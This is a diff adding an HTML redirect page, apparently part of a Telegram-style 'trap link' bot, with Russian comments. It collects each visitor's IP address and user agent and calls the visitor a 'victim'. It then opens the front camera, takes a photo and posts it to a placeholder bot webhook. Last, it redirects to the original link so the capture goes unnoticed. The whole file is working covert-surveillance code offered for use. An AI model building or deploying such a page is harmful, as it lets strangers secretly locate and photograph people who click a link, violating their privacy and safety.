@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+</head>
+<body>
+    <script>
+        // Получаем параметры из URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const trapId = urlParams.get('tid');
+        
+        // Отправляем данные жертвы на сервер бота
+        $.getJSON('https://api.ipify.org?format=json', function(data) {
+            $.post('YOUR_BOT_WEBHOOK_URL', {
+                trap_id: trapId,
+                ip: data.ip,
+                user_agent: navigator.userAgent
+            });
+        });
+        
+        // Эмутация доступа к камере
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(function(stream) {
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                return imageCapture.takePhoto();
+            })
+            .then(blob => {
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = function() {
+                    $.post('YOUR_BOT_WEBHOOK_URL', {
+                        trap_id: trapId,
+                        photo: reader.result
+                    });
+                }
+            })
+            .catch(err => console.log(err));
+        
+        // Перенаправление на оригинальную ссылку
+        setTimeout(() => window.location.href = 'ORIGINAL_LINK_FROM_DB', 2000);
+    </script>
+</body>
+</html>
